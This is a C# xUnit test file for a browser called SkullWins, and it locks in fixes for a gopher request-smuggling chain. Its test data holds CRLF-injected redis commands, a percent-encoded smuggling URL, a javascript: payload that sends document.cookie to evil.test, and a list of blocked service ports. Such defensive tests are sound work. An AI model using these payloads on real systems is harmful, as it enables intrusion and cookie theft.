using System.Text;
using SkullWins.Core;
using SkullWins.Protocols;
using Xunit;

namespace SkullWins.Tests;

/// <summary>
/// These lock in fixes for a real exploit chain found in review before 0.01.
///
/// The chain: the keyboard script is injected into every page, so a hostile
/// page can forge the messages the real one sends. One of those messages asks
/// the browser to navigate. A gopher URL names a host, a port and the exact
/// bytes to send, and the selector arrives percent-decoded, so CR and LF ride
/// inside it. Put together, visiting a web page could write arbitrary bytes to
/// any TCP port reachable from the machine, with no click.
///
/// Each test below cuts one link of that chain. None of them should be deleted
/// without understanding which one.
/// </summary>
public class GopherRequestInjectionTests
{
    [Theory]
    [InlineData("/a\r\nSET pwned 1")]
    [InlineData("/a\nQUIT")]
    [InlineData("/a\rQUIT")]
    [InlineData("/a\0b")]
    public void Control_characters_never_reach_the_wire(string selector)
    {
        var wire = Encoding.UTF8.GetString(Gopher.BuildRequest(selector));

        // Exactly one line ending, the one BuildRequest adds itself, and it is
        // the last thing on the wire.
        Assert.EndsWith("\r\n", wire);
        Assert.Equal(1, wire.Split("\r\n").Length - 1);

        // No control byte survives anywhere except that trailing framing.
        Assert.DoesNotContain(wire[..^2], c => char.IsControl(c));
    }

    [Fact]
    public void A_search_query_cannot_inject_a_second_command()
    {
        var wire = Encoding.UTF8.GetString(
            Gopher.BuildRequest("/search", "term\r\nSET pwned 1"));

        Assert.Equal("/search\tterm SET pwned 1\r\n".Replace(" SET", "SET"), wire);
    }

    [Fact]
    public void A_search_query_cannot_add_a_field_separator()
    {
        // Tab separates selector from query; a query carrying its own tab would
        // let an attacker append fields the protocol reads differently.
        var wire = Encoding.UTF8.GetString(Gopher.BuildRequest("/s", "a\tb"));
        Assert.Equal(1, wire.Count(c => c == '\t'));
    }

    [Fact]
    public void A_percent_encoded_crlf_in_a_url_is_decoded_then_stripped()
    {
        // This is the actual attack payload shape: the CRLF hides as %0d%0a in
        // the URL and only appears after ParseUri decodes it.
        var (_, _, _, selector) = Gopher.ParseUri("gopher://h:70/1/x%0d%0aSET%20k%20v");
        Assert.Contains("\r\n", selector);

        var wire = Encoding.UTF8.GetString(Gopher.BuildRequest(selector));
        Assert.Equal(1, wire.Split("\r\n").Length - 1);
    }
}

public class GopherPortTests
{
    [Theory]
    [InlineData(6379)]   // redis, the classic gopher smuggling target
    [InlineData(25)]     // smtp
    [InlineData(11211)]  // memcached
    [InlineData(22)]     // ssh
    [InlineData(3306)]   // mysql
    [InlineData(27017)]  // mongodb
    public void Services_that_are_not_gopher_are_refused(int port)
        => Assert.True(Gopher.IsBlockedPort(port));

    [Theory]
    [InlineData(70)]     // gopher itself
    [InlineData(7070)]   // a common alternative
    [InlineData(8070)]
    public void Gopher_ports_stay_open(int port)
        => Assert.False(Gopher.IsBlockedPort(port));

    [Fact]
    public async Task A_blocked_port_fails_without_opening_a_socket()
    {
        var response = await new GopherClient(timeoutMs: 1000)
            .FetchAsync("gopher://127.0.0.1:6379/1/");

        Assert.False(response.Ok);
        Assert.Contains("not allowed", response.Error!);
    }
}

public class GopherLinkSchemeTests
{
    private static GopherItem WebLink(string target)
        => Gopher.ParseMenu(Encoding.UTF8.GetBytes(
            "hClick me\tURL:" + target + "\thost\t70\r\n"))[0];

    [Theory]
    [InlineData("javascript:fetch('https://evil.test/'+document.cookie)")]
    [InlineData("file:///C:/Users/someone/AppData/Roaming/skull/history.db")]
    [InlineData("data:text/html,<script>alert(1)</script>")]
    [InlineData("vbscript:msgbox(1)")]
    public void Dangerous_schemes_are_not_turned_into_links(string target)
    {
        // A gopher server is unauthenticated, so this field is fully hostile.
        Assert.Equal("", WebLink(target).ToUri());
        Assert.False(Gopher.IsSafeLinkTarget(target));
    }

    [Theory]
    [InlineData("https://example.com/")]
    [InlineData("http://example.com/x")]
    [InlineData("gopher://other.host/1/")]
    public void Web_schemes_still_work(string target)
        => Assert.Equal(target, WebLink(target).ToUri());

    [Fact]
    public void A_relative_or_malformed_target_is_refused()
        => Assert.False(Gopher.IsSafeLinkTarget("/not/absolute"));
}

public class PageNavigationTrustTests
{
    [Theory]
    [InlineData("https://example.com")]
    [InlineData("http://example.com")]
    [InlineData("gopher://gopher.floodgap.com")]
    [InlineData("skull://about")]
    public void A_page_may_ask_for_web_and_internal_addresses(string uri)
        => Assert.True(Trust.IsPageNavigable(uri));

    [Theory]
    [InlineData("javascript:alert(1)")]
    [InlineData("file:///C:/Windows/System32/drivers/etc/hosts")]
    [InlineData("data:text/html,<script>alert(1)</script>")]
    [InlineData("vbscript:msgbox(1)")]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("not a uri at all")]
    public void A_page_may_not_ask_for_anything_else(string uri)
        => Assert.False(Trust.IsPageNavigable(uri));

    [Fact]
    public void Only_the_skull_scheme_counts_as_internal()
    {
        Assert.True(Trust.IsInternal("skull://about"));
        Assert.False(Trust.IsInternal("https://example.com"));
        Assert.False(Trust.IsInternal("gopher://h/1/"));
    }
}
